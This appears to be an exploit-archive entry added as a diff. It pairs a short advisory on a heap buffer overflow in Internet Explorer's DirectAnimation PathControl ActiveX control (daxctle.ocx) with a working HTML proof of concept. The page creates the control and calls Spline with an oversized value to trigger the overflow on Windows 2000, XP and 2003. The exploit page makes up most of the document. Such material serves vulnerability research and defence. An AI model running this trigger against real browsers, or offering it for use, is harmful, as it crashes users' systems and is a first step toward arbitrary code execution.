@@ -1,0 +1,34 @@
+source: http://www.securityfocus.com/bid/19738/info
+
+Microsoft Internet Explorer is prone to a heap buffer-overflow vulnerability.. 
+
+The vulnerability arises because of the way Internet Explorer tries to instantiate certain COM objects as ActiveX controls. 
+
+An attacker can exploit this issue to execute arbitrary code within context of the affected application. Failed exploit attempts will result in a denial-of-service condition.
+
+// Internet Explorer (daxctle.ocx) Heap Overflow Vulnerability
+// tested on Windows 2000 SP4/XP SP2/2003 SP1
+
+// http://www.xsec.org
+// nop (nop#xsec.org)
+
+// CLSID: {D7A7D7C3-D47F-11D0-89D3-00A0C90833E6}
+// Info: Microsoft DirectAnimation Path
+// ProgID: DirectAnimation.PathControl
+// InprocServer32: C:\WINNT\system32\daxctle.ocx
+
+--!>
+<html>
+<head>
+<title>test</title>
+</head>
+<body>
+<script>
+
+var target = new ActiveXObject("DirectAnimation.PathControl");
+
+target.Spline(0xffffffff, 1);
+
+</script>
+</body>
+</html>
